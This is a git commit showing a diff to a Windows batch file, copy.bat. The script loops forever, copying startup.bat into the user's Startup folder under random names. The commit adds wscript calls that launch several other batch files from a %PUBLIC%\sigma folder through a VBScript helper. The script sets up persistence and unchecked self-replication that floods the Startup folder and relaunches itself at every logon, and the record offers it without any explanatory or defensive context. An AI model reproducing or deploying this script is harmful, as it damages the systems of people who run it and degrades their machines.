fb57181bcfafacc36831731a0d556ae26b91baf2
AXL.Alixx <58485851+axlalixx@users.noreply.github.com>
2024-12-20 01:56:39 +0000

    Update copy.bat

--- copy.bat
+++ copy.bat
@@ -1,4 +1,9 @@
 @echo off
 :loop
 copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\d%random%d.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\filel.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\sigma.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\copy.bat
+wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\startup.bat
 goto loop
